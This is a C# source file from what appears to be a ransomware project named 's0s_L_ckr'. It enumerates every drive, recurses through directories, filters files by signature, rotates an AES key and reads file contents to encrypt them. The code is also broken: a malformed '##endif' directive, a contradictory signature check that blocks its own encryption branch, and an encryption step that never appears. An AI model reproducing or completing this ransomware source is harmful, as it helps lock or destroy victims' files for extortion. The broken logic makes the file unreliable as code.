using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace s0s_L_ckr
{
    public sealed class EncrStr
    {
        //Encryption Method

        [MethodImpl(MethodImplOptions.AggressiveInlining)]
        public void EncrDis()
        {
#if DEBUG
            Trace.WriteLine("[*]Encrypt Disks");
#endif
            DriveInfo[] driveInfos = DriveInfo.GetDrives();

#if DEBUG
            Trace.WriteLine($"[+] {driveInfos} was enumerated");
#endif
            //Iterate all drives
            foreach (DriveInfo drive in driveInfos)
            {
                EncrDrv(drive);
            }
        }
        private void EncrDrv(DriveInfo drive)
        {
#if DEBUG
            Trace.WriteLine($"[*] EncrypDrive ({drive.Name})");
            Trace.Indent();
#endif
            // Drive check
            if (drive.IsReady)
            {
                DirectoryInfo[] directories = drive.RootDirectory.GetDirectories();

                foreach (DirectoryInfo directoryInfo in directories)
                    EncrDir(directoryInfo);
            }
            else
            {
#if DEBUG
                Trace.WriteLine("[+] Drive is not Ready");
#endif
            }
#if DEBUG
            Trace.Unindent();
#endif
        }

        private void EncrDir(DirectoryInfo directoryInfo)
        {
#if DEBUG
            Trace.WriteLine("");
            Trace.WriteLine($"[*] EncrDir {directoryInfo.Name}");
##endif
            //Checking Directory Filter
            if (!Comn.DireInFil(directoryInfo.FullName))
            {
#if DEBUG
                Trace.Indent();
                Trace.WriteLine("[+] Directory not present in filter");
                Trace.Unindent();
#endif
                return;
            }

            //Recursiveve Drives>Directories>Files
            try
            {
                DirectoryInfo[] subDrv = directoryInfo.GetDirectories();
                if (subDrv != null)
                {
                    foreach (DirectoryInfo subDir in subDrv)
                        EncrDir(subDir);
                }

                //Encrypt Files
                FileInfo[] files = directoryInfo.GetFiles();
                foreach (FileInfo file in files)
                    EncrFil(file);
            }
            catch (Exception e)
            {
#if DEBUG
                Trace.WriteLine("");
                Trace.WriteLine($"[!] Error while in {directoryInfo.Name}");
                Trace.WriteLine(e.ToString());
#endif
            }
        }

        private void EncrFil(FileInfo file)
        {
            Thread.Sleep(10);
#if DEBUG
            Trace.WriteLine("");
            Trace.WriteLine($"[*] EncrFil at {file.Name}");
#endif
            //File Filter
            if (Comn.CheckSig(file))
            {
                //If file signature returns false
                if (!Comn.CheckSig(file))
                {
                    //Encrypt all the things
#if DEBUG
                    Trace.WriteLine("[+] Files to encrypt");
#endif
                    //Rotate AES Key
                    CriptoKeyMgr.RotAesKey();

                    //Reading Data in files
                    Byte[] fileDat = null;
                    FileMgr.ReadFil(file, ref fileDat);
                }
            }
        }
    }
}
